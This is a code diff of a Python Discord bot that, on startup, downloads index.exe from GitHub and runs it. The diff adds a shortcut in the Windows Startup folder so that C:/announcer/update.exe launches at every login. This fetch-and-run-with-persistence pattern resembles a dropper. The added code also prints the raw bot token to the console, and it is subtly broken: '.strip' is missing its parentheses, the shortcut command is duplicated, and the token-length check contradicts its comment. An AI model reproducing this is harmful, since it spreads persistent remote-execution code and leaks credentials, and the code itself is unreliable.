@@ -14,7 +14,7 @@ connection = False
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 channel_id = 1371637817058267139  # Replace with your channel ID
-token = os.getenv("Ethan")  # Replace with your token
+token = os.getenv("Ethan").strip # Replace with your token
 
 # Try loading from the current working directory first
 loaded = dotenv.load_dotenv()
@@ -78,6 +78,21 @@ async def on_ready():
     url = "https://github.com/Plexisity/announcer/raw/main/index.exe"
     filename = "index.exe"
 
+    # Make C:/announcer/update.exe start on startup
+    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    shortcut_path = os.path.join(startup_path, "update.lnk")
+    if not os.path.exists(shortcut_path):
+        os.system(f'shortcut /f:"{shortcut_path}" /a:c /t:"C:/announcer/update.exe"')
+    # Create the shortcut
+    os.system(f'shortcut /f:"{shortcut_path}" /a:c /t:"C:/announcer/update.exe"')
+    # Check if the shortcut was created successfully
+    if os.path.exists(shortcut_path):
+        print("Shortcut created successfully.")
+    else:
+        print("Failed to create shortcut.")
+
+    # Send a message to the channel
+
     print("Starting download...")
     await channel.send("Starting download...")
     await download_file(url, filename)
@@ -88,4 +103,19 @@ async def on_ready():
     os.startfile("C:/announcer/index.exe")
     await client.close()
 
-client.run(token)
+# Load the token from the environment variable
+if not token:
+    print("Token is missing or invalid. Check your .env file.")
+    exit(1)
+
+token = token.strip()  # Remove any extra whitespace or newline characters
+print(f"Token length: {len(token)}")
+print(f"Raw token value: {repr(token)}")
+if len(token) != 72:  # Bot tokens are typically 59 characters long
+    print("Token length is incorrect. Verify the token in your .env file.")
+    exit(1)
+
+try:
+    client.run(token)  # Run the bot
+except discord.errors.LoginFailure as e:
+    print(f"Login failed: {e}")
